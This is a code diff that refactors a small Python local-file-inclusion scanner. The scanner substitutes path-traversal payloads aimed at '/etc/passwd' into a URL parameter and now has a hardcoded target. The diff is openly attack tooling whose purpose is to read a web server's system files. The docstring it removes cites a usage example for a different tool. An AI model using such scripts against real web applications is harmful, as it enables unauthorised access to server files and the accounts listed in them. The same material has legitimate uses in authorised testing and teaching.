@@ -2,29 +2,13 @@ import requests
 import sys
 
 
-def LFI():
-	'''
-    Local File Inclusion 
-    
-    Here we try to accesss to passwd of the server where the webapp is running
-    We use the url and the parameter, and we try to find the correct path with payloads.
-    
-    Parameters:    
-        URL of your target website with the parameter (like "url?image=)
-        {fuzz}, the word that will be replaced by payloads
-        
-    Returns:
-    String --> Path to access to passwd
-    
-    Exemple : "python3 fuxploider.py --url https://awesomeFileUploadService.com --not-regex "wrong file type"
-        
-    '''
-	if len(sys.argv) < 2:
+def LFI(URL):
+	if len(URL) < 5:
 		sys.exit("[-]ERROR - Missing target URL")
-	elif not '{fuzz}' in sys.argv[1]:
+	elif not '{fuzz}' in URL:
 		sys.exit("[-]ERROR - Missing {fuzz} parameter\nExemple : http://127.168.0.1/index.php?image=\{fuzz\}")
 	else:
-		selected_target = sys.argv[1]
+		selected_target = URL
 
 	payloads = ['/etc/passwd','../etc/passwd','../../etc/passwd','../../../etc/passwd']
 
@@ -38,4 +22,4 @@ def LFI():
 	print("[+]INFO - Scan finished")
 
 if __name__ == '__main__':
-	LFI()
+	LFI("http://127.168.0.1/index.php?image={fuzz}")
